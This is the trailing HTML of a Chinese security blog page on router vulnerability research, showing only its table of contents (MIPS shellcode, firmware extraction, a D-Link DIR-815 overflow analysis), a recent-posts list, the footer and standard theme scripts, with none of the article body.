href="#%E6%9E%84%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE"><span class="toc-number">3.3.4.</span> <span class="toc-text">构建漏洞攻击数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MIPS-shellcode-%E5%BC%80%E5%8F%91"><span class="toc-number">4.</span> <span class="toc-text">MIPS shellcode 开发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MIPS-Linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">4.1.</span> <span class="toc-text">MIPS Linux 系统调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-%E7%BC%96%E5%86%99%E6%AD%A5%E9%AA%A4"><span class="toc-number">4.2.</span> <span class="toc-text">shellcode 编写步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode-%E7%BC%96%E7%A0%81%E4%BC%98%E5%8C%96"><span class="toc-number">4.3.</span> <span class="toc-text">shellcode 编码优化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E4%BC%98%E5%8C%96"><span class="toc-number">4.3.1.</span> <span class="toc-text">指令优化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E7%BC%96%E7%A0%81"><span class="toc-number">4.3.2.</span> <span class="toc-text">shellcode 编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%99%A8%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8F%90%E5%8F%96"><span class="toc-number">5.</span> <span class="toc-text">路由器文件系统提取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%8F%90%E5%8F%96"><span class="toc-number">5.1.</span> <span class="toc-text">手动提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8F%96"><span class="toc-number">5.2.</span> <span class="toc-text">自动提取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AE%80%E4%BB%8B"><span class="toc-number">6.</span> <span class="toc-text">漏洞分析简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#D-Link-DIR-815-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">D-Link DIR-815 路由器多次溢出漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-number">7.1.</span> <span class="toc-text">固件提取</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/05/27/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F-2024-re/" title="上海大学生-2024-re"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover2.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="上海大学生-2024-re"/></a><div class="content"><a class="title" href="/2024/05/27/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F-2024-re/" title="上海大学生-2024-re">上海大学生-2024-re</a><time datetime="2024-05-27T14:35:03.000Z" title="发表于 2024-05-27 22:35:03">2024-05-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/27/CISCN-2024-re/" title="CISCN-2024-re"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover2.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CISCN-2024-re"/></a><div class="content"><a class="title" href="/2024/05/27/CISCN-2024-re/" title="CISCN-2024-re">CISCN-2024-re</a><time datetime="2024-05-27T14:34:51.000Z" title="发表于 2024-05-27 22:34:51">2024-05-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/27/%E4%BA%AC%E9%BA%92CTF-2024-re-wp/" title="京麒CTF-2024-re-wp"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover2.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="京麒CTF-2024-re-wp"/></a><div class="content"><a class="title" href="/2024/05/27/%E4%BA%AC%E9%BA%92CTF-2024-re-wp/" title="京麒CTF-2024-re-wp">京麒CTF-2024-re-wp</a><time datetime="2024-05-27T13:37:23.000Z" title="发表于 2024-05-27 21:37:23">2024-05-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/25/%E9%93%81%E4%B8%892024-re/" title="铁三2024-re"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover2.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="铁三2024-re"/></a><div class="content"><a class="title" href="/2024/05/25/%E9%93%81%E4%B8%892024-re/" title="铁三2024-re">铁三2024-re</a><time datetime="2024-05-25T03:42:12.000Z" title="发表于 2024-05-25 11:42:12">2024-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/" title="路由器漏洞挖掘初探"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="路由器漏洞挖掘初探"/></a><div class="content"><a class="title" href="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/" title="路由器漏洞挖掘初探">路由器漏洞挖掘初探</a><time datetime="2024-04-18T08:59:23.000Z" title="发表于 2024-04-18 16:59:23">2024-04-18</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By EPs1l0h</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/'
    this.page.identifier = '/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/'
    this.page.title = '路由器漏洞挖掘初探'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><div class="aplayer no-destroy" data-id="2981528901" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>